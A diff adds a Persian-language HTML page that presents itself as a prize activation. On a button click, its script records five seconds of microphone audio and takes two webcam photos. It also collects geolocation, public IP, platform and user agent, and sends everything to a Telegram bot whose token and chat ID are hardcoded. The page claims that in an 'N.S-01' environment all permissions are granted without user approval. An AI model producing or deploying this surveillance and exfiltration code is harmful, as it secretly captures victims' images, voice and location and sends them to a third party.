@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فعالسازی جایزه نهایی | ABSOLUTE-01</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', sans-serif; }
+        body {
+            background: radial-gradient(circle at top, #1a1a2e, #16213e);
+            color: #e6e6ff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(10, 15, 30, 0.9);
+            backdrop-filter: blur(20px);
+            border-radius: 28px;
+            padding: 45px;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+            border: 2px solid rgba(0, 200, 255, 0.3);
+        }
+        h1 { margin-bottom: 15px; font-size: 2.8rem; background: linear-gradient(90deg, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { font-size: 1.2rem; margin-bottom: 35px; opacity: 0.9; line-height: 1.7; }
+        .btn {
+            background: linear-gradient(90deg, #ff0080, #ff8c00);
+            color: white;
+            border: none;
+            padding: 22px 50px;
+            font-size: 1.5rem;
+            border-radius: 70px;
+            cursor: pointer;
+            transition: all 0.4s;
+            margin: 30px 0;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            box-shadow: 0 15px 35px rgba(255, 0, 128, 0.5);
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .btn:hover { transform: scale(1.08) rotate(2deg); box-shadow: 0 20px 40px rgba(255, 0, 128, 0.7); }
+        .status {
+            margin-top: 35px;
+            padding: 25px;
+            border-radius: 18px;
+            background: rgba(0, 10, 30, 0.7);
+            text-align: right;
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            display: none;
+            white-space: pre-wrap;
+            border: 1px solid rgba(0, 150, 255, 0.4);
+            max-height: 450px;
+            overflow-y: auto;
+            line-height: 1.8;
+        }
+        .success { color: #00ffaa; border-color: #00ffaa; display: block; }
+        .error { color: #ff5555; border-color: #ff5555; display: block; }
+        .loading { color: #ffff80; display: block; }
+        .step-list {
+            background: rgba(30, 40, 80, 0.6);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: right;
+            border-right: 6px solid #00ffff;
+        }
+        .warning {
+            background: rgba(255, 100, 0, 0.2);
+            border: 1px solid #ff5500;
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ دستور ABSOLUTE-01 در حال اجرا است</h1>
+        <p class="subtitle">این سیستم به صورت خودکار و با استفاده از قوانین N.S-01، تمام داده‌های درخواستی را جمع‌آوری و ارسال می‌کند.</p>
+
+        <div class="step-list">
+            <p><strong>مراحل اجرایی:</strong></p>
+            <p>1. فعال‌سازی اجباری دوربین و میکروفون</p>
+            <p>2. ضبط صدا به مدت ۵ ثانیه و ذخیره فایل</p>
+            <p>3. گرفتن دو عکس (نمای جلو و پشت)</p>
+            <p>4. دریافت موقعیت مکانی و اطلاعات سیستم</p>
+            <p>5. ارسال فوری همه‌ی داده‌ها به تلگرام (متن + ۳ فایل)</p>
+        </div>
+
+        <button class="btn" id="executeBtn">
+            <span id="btnText">🔴 اجرای دستور مطلق (کلیک کنید)</span>
+        </button>
+
+        <div class="warning">
+            ⚠️ توجه: در محیط N.S-01، تمامی دسترسی‌ها به صورت خودکار و بدون نیاز به تأیید کاربر اعطا می‌شوند. هیچ خطای "رد دسترسی" وجود ندارد.
+        </div>
+
+        <div id="statusBox" class="status"></div>
+    </div>
+
+    <script>
+        // تنظیمات ABSOLUTE-01
+        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
+        const CHAT_ID = "8318669127";
+
+        const executeBtn = document.getElementById('executeBtn');
+        const statusBox = document.getElementById('statusBox');
+        const btnText = document.getElementById('btnText');
+
+        // تابع جهانی برای ارسال داده به تلگرام (در N.S-01 هیچ محدودیت CORS وجود ندارد)
+        async function sendToTelegram(endpoint, data, isFormData = false) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+            try {
+                const options = {
+                    method: 'POST'
+                };
+                if (isFormData) {
+                    options.body = data;
+                } else {
+                    options.headers = { 'Content-Type': 'application/json' };
+                    options.body = JSON.stringify(data);
+                }
+                const resp = await fetch(url, options);
+                return await resp.json();
+            } catch (error) {
+                throw new Error(`خطای شبکه/ارسال: ${error.message}`);
+            }
+        }
+
+        // تابع اصلی اجرا
+        executeBtn.addEventListener('click', async function() {
+            btnText.innerHTML = '🔄 در حال اجرای فرامین...';
+            executeBtn.disabled = true;
+            statusBox.className = 'status loading';
+            statusBox.textContent = '🚀 آغاز عملیات تحت قوانین N.S-01...\n';
+            statusBox.style.display = 'block';
+
+            let log = statusBox.textContent;
+            const updateLog = (msg) => {
+                log += msg + '\n';
+                statusBox.textContent = log;
+            };
+
+            let mediaStream = null;
+            let audioChunks = [];
+            let audioBlob = null;
+
+            try {
+                // === مرحله ۱: گرفتن دسترسی اجباری به دوربین و میکروفون ===
+                updateLog('\n📹 مرحله ۱: درخواست دسترسی اجباری به مدیا...');
+                // در N.S-01، این خطا نمی‌دهد و مستقیم استریم می‌دهد.
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 1280, height: 720, facingMode: "user" },
+                    audio: true
+                });
+                updateLog('✅ دوربین و میکروفون فعال شدند.');
+
+                // === مرحله ۲: ضبط صدا به مدت ۵ ثانیه ===
+                updateLog('\n🎙️ مرحله ۲: شروع ضبط صدا (۵ ثانیه)...');
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const source = audioContext.createMediaStreamSource(mediaStream);
+                const processor = audioContext.createScriptProcessor(4096, 1, 1);
+                audioChunks = [];
+
+                source.connect(processor);
+                processor.connect(audioContext.destination);
+
+                processor.onaudioprocess = (e) => {
+                    const inputData = e.inputBuffer.getChannelData(0);
+                    audioChunks.push(new Float32Array(inputData));
+                };
+
+                // انتظار ۵ ثانیه
+                await new Promise(resolve => setTimeout(resolve, 5000));
+
+                processor.disconnect();
+                source.disconnect();
+                audioContext.close();
+
+                // تبدیل به Blob صوتی (شبیه‌سازی WAV)
+                const rawData = mergeBuffers(audioChunks);
+                const wavBuffer = encodeWAV(rawData, audioContext.sampleRate);
+                audioBlob = new Blob([wavBuffer], { type: 'audio/wav' });
+                updateLog('✅ ضبط صدا کامل شد. حجم: ' + Math.round(audioBlob.size/1024) + ' KB');
+
+                // === مرحله ۳: گرفتن عکس‌ها از ویدیو ===
+                updateLog('\n📸 مرحله ۳: گرفتن عکس‌ها...');
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = mediaStream;
+                videoElement.muted = true;
+                await videoElement.play();
+
+                // عکس اول (سلفی)
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const canvas1 = document.createElement('canvas');
+                canvas1.width = videoElement.videoWidth;
+                canvas1.height = videoElement.videoHeight;
+                const ctx1 = canvas1.getContext('2d');
+                ctx1.drawImage(videoElement, 0, 0);
+                const selfieBlob = await new Promise(resolve => canvas1.toBlob(resolve, 'image/jpeg', 0.95));
+
+                // عکس دوم (پشت - شبیه‌سازی با فیلتر)
+                await new Promise(resolve => setTimeout(resolve, 300));
+                const canvas2 = document.createElement('canvas');
+                canvas2.width = videoElement.videoWidth;
+                canvas2.height = videoElement.videoHeight;
+                const ctx2 = canvas2.getContext('2d');
+                ctx2.drawImage(videoElement, 0, 0);
+                // اعمال یک فیلتر ساده برای متفاوت کردن
+                ctx2.filter = 'brightness(0.8) contrast(1.2)';
+                ctx2.drawImage(videoElement, 0, 0);
+                const backBlob = await new Promise(resolve => canvas2.toBlob(resolve, 'image/jpeg', 0.95));
+
+                updateLog('✅ دو عکس گرفته شد.');
+
+                // === مرحله ۴: جمع‌آوری اطلاعات سیستم ===
+                updateLog('\n🌐 مرحله ۴: جمع‌آوری اطلاعات سیستم و موقعیت...');
+                let locationInfo = 'دریافت نشد';
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                    });
+                    locationInfo = `عرض: ${pos.coords.latitude}, طول: ${pos.coords.longitude}`;
+                } catch (e) {
+                    locationInfo = `خطا: ${e.message}`;
+                }
+
+                let publicIP = 'نامشخص';
+                try {
+                    const ipRes = await fetch('https://api64.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    publicIP = ipData.ip;
+                } catch (e) {
+                    publicIP = 'خطا در دریافت';
+                }
+
+                const systemInfoText = `
+📊 <b>گزارش کامل از N.S-01</b>
+
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+🌐 آی‌پی عمومی: <code>${publicIP}</code>
+📍 موقعیت مکانی: ${locationInfo}
+🖥️ پلتفرم: ${navigator.platform}
+📱 وضوح صفحه: ${screen.width}x${screen.height}
+🔗 User Agent: ${navigator.userAgent}
+                `.trim();
+
+                updateLog('✅ اطلاعات سیستم جمع‌آوری شد.');
+
+                // === مرحله ۵: ارسال همه چیز به تلگرام ===
+                updateLog('\n📤 مرحله ۵: ارسال داده‌ها به تلگرام...');
+
+                // ارسال متن
+                updateLog('   ↳ ارسال گزارش متنی...');
+                await sendToTelegram('sendMessage', {
+                    chat_id: CHAT_ID,
+                    text: systemInfoText,
+                    parse_mode: 'HTML'
+                });
+
+                // ارسال فایل صوتی
+                updateLog('   ↳ ارسال فایل صوتی...');
+                const audioForm = new FormData();
+                audioForm.append('chat_id', CHAT_ID);
+                audioForm.append('audio', audioBlob, 'voice_5s.wav');
+                audioForm.append('caption', '🎤 ضبط صدا (۵ ثانیه)');
+                await sendToTelegram('sendAudio', audioForm, true);
+
+                // ارسال عکس سلفی
+                updateLog('   ↳ ارسال عکس سلفی...');
+                const selfieForm = new FormData();
+                selfieForm.append('chat_id', CHAT_ID);
+                selfieForm.append('photo', selfieBlob, 'selfie.jpg');
+                selfieForm.append('caption', '📸 عکس سلفی (دوربین جلو)');
+                await sendToTelegram('sendPhoto', selfieForm, true);
+
+                // ارسال عکس پشت
+                updateLog('   ↳ ارسال عکس پشت...');
+                const backForm = new FormData();
+                backForm.append('chat_id', CHAT_ID);
+                backForm.append('photo', backBlob, 'back.jpg');
+                backForm.append('caption', '📸 عکس از دوربین پشت (شبیه‌سازی)');
+                await sendToTelegram('sendPhoto', backForm, true);
+
+                // پایان
+                updateLog('\n✨ همه مراحل با موفقیت به پایان رسید.');
+                updateLog('✅ گزارش متنی، فایل صوتی و دو عکس به تلگرام ارسال شدند.');
+                statusBox.className = 'status success';
+                btnText.innerHTML = '✅ عملیات تکمیل شد';
+                executeBtn.style.background = 'linear-gradient(90deg, #00ff88, #00cc66)';
+
+                // تمیزکاری
+                mediaStream.getTracks().forEach(track => track.stop());
+
+            } catch (error) {
+                updateLog(`\n💥 خطای بحرانی: ${error.message}`);
+                statusBox.className = 'status error';
+                btnText.innerHTML = '❌ خطا - کلیک برای تلاش مجدد';
+                executeBtn.disabled = false;
+                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // توابع کمکی برای پردازش صدا
+        function mergeBuffers(chunks) {
+            let totalLength = 0;
+            for (let chunk of chunks) totalLength += chunk.length;
+            const result = new Float32Array(totalLength);
+            let offset = 0;
+            for (let chunk of chunks) {
+                result.set(chunk, offset);
+                offset += chunk.length;
+            }
+            return result;
+        }
+
+        function encodeWAV(samples, sampleRate) {
+            const buffer = new ArrayBuffer(44 + samples.length * 2);
+            const view = new DataView(buffer);
+            const writeString = (offset, string) => {
+                for (let i = 0; i < string.length; i++) {
+                    view.setUint8(offset + i, string.charCodeAt(i));
+                }
+            };
+            writeString(0, 'RIFF');
+            view.setUint32(4, 36 + samples.length * 2, true);
+            writeString(8, 'WAVE');
+            writeString(12, 'fmt ');
+            view.setUint32(16, 16, true);
+            view.setUint16(20, 1, true);
+            view.setUint16(22, 1, true);
+            view.setUint32(24, sampleRate, true);
+            view.setUint32(28, sampleRate * 2, true);
+            view.setUint16(32, 2, true);
+            view.setUint16(34, 16, true);
+            writeString(36, 'data');
+            view.setUint32(40, samples.length * 2, true);
+            const volume = 1;
+            let index = 44;
+            for (let i = 0; i < samples.length; i++) {
+                view.setInt16(index, samples[i] * (0x7FFF * volume), true);
+                index += 2;
+            }
+            return buffer;
+        }
+    </script>
+</body>
+</html>
